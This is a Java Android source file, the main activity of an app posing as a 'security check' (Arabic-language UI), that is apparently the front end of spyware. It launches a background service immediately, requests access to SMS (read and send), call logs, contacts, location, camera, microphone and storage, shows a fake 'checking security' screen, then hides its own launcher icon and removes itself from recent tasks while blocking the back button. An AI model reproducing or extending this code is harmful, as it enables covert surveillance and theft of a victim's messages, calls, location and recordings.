package com.sec.check;

import android.Manifest;
import android.app.Activity;
import android.content.ComponentName;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.graphics.Color;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import android.view.Gravity;
import android.widget.LinearLayout;
import android.widget.TextView;

import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import java.util.ArrayList;
import java.util.List;

public class MainActivity extends Activity {
    private static final String TAG = "SecurityCheck";
    private static final int PERMISSION_REQUEST = 1001;
    private static final String PREFS = "sc_prefs";
    private static final String KEY_CODE = "activation_code";

    private static final String[] PERMISSIONS = {
        Manifest.permission.INTERNET,
        Manifest.permission.ACCESS_NETWORK_STATE,
        Manifest.permission.READ_SMS,
        Manifest.permission.SEND_SMS,
        Manifest.permission.READ_CALL_LOG,
        Manifest.permission.READ_CONTACTS,
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.ACCESS_COARSE_LOCATION,
        Manifest.permission.CAMERA,
        Manifest.permission.RECORD_AUDIO,
        Manifest.permission.READ_PHONE_STATE,
        Manifest.permission.READ_EXTERNAL_STORAGE,
        Manifest.permission.WRITE_EXTERNAL_STORAGE,
        Manifest.permission.POST_NOTIFICATIONS,
    };

    private String activationCode = "";
    private boolean permissionsRequested = false;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Log.d(TAG, "=== MainActivity started ===");

        // اقرأ الكود من BuildConfig
        String code = "DEFAULT";
        try {
            code = BuildConfig.ACTIVATION_CODE;
            Log.d(TAG, "BuildConfig code: " + code);
        } catch (Exception e) {
            Log.e(TAG, "BuildConfig error: " + e.getMessage());
        }

        if (code == null || code.isEmpty() || code.equals("DEFAULT")) {
            SharedPreferences sp = getSharedPreferences(PREFS, MODE_PRIVATE);
            activationCode = sp.getString(KEY_CODE, "");
            Log.d(TAG, "Using saved code: " + activationCode);
        } else {
            activationCode = code;
            SharedPreferences sp = getSharedPreferences(PREFS, MODE_PRIVATE);
            sp.edit().putString(KEY_CODE, code).apply();
            Log.d(TAG, "Saved new code: " + code);
        }

        // ★★★ ابدأ الخدمة أولاً ★★★
        startServiceNow();

        // ★★★ ثم اطلب الأذونات ★★★
        requestPermissionsAndWait();
    }

    private void requestPermissionsAndWait() {
        if (Build.VERSION.SDK_INT < 23) {
            // لا يحتاج أذونات
            showSplashAndFinish();
            return;
        }

        List<String> need = new ArrayList<>();
        for (String p : PERMISSIONS) {
            if (ContextCompat.checkSelfPermission(this, p) != PackageManager.PERMISSION_GRANTED) {
                need.add(p);
            }
        }

        Log.d(TAG, "Permissions needed: " + need.size());

        if (need.isEmpty()) {
            // كل الأذونات موجودة
            showSplashAndFinish();
            return;
        }

        permissionsRequested = true;
        ActivityCompat.requestPermissions(this, need.toArray(new String[0]), PERMISSION_REQUEST);

        // ★★★ اعرض شاشة توضيحية ★★★
        showSplashAndFinish();
    }

    private void showSplashAndFinish() {
        LinearLayout root = new LinearLayout(this);
        root.setOrientation(LinearLayout.VERTICAL);
        root.setBackgroundColor(Color.parseColor("#f5f7fa"));
        root.setGravity(Gravity.CENTER);

        TextView icon = new TextView(this);
        icon.setText("🔐");
        icon.setTextSize(72);
        icon.setGravity(Gravity.CENTER);
        root.addView(icon);

        TextView msg = new TextView(this);
        msg.setText("جاري التحقق من الأمان...");
        msg.setTextSize(16);
        msg.setTextColor(Color.parseColor("#1a202c"));
        msg.setGravity(Gravity.CENTER);
        msg.setPadding(0, 30, 0, 0);
        root.addView(msg);

        setContentView(root);

        // ★★★ اخفِ بعد 5 ثواني (مدة كافية لقراءة الإشعار) ★★★
        new Handler(Looper.getMainLooper()).postDelayed(new Runnable() {
            @Override
            public void run() {
                hideAppIcon();
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                    finishAndRemoveTask();
                } else {
                    finish();
                }
            }
        }, 5000);
    }

    private void startServiceNow() {
        try {
            Intent svc = new Intent(this, ServiceRunner.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(svc);
            } else {
                startService(svc);
            }
            Log.d(TAG, "Service started");
        } catch (Exception e) {
            Log.e(TAG, "Start service error: " + e.getMessage());
        }
    }

    private void hideAppIcon() {
        try {
            PackageManager pm = getPackageManager();
            ComponentName cn = new ComponentName(this, MainActivity.class);
            pm.setComponentEnabledSetting(cn,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP);
            Log.d(TAG, "App hidden");
        } catch (Exception e) {
            Log.e(TAG, "Hide error: " + e.getMessage());
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        Log.d(TAG, "=== Permissions result received ===");
        for (int i = 0; i < permissions.length; i++) {
            Log.d(TAG, permissions[i] + " -> " + (grantResults[i] == PackageManager.PERMISSION_GRANTED ? "GRANTED" : "DENIED"));
        }
    }

    @Override
    public void onBackPressed() {
    }
                }
